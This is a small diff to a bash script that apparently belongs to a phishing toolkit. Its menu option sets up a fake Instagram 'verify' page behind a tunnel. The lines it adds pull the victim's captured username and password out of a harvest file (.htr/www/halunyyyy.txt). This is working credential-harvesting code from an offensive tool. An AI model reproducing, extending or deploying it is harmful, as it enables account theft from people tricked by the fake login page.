@@ -267,6 +267,9 @@ tunnel_menu
 elif [[ $ig_option == 3 || $ig_option == 03 ]]; then
 website="ig_verify"
 tunnel_menu
+account=$(grep -o 'username:.*' .htr/www/halunyyyy.txt | cut -d " " -f2)
+IFS=$'\n'
+password=$(grep -o 'Pass:.*' .htr/www/halunyyyy.txt | cut -d ":" -f2)
 
 else
 printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
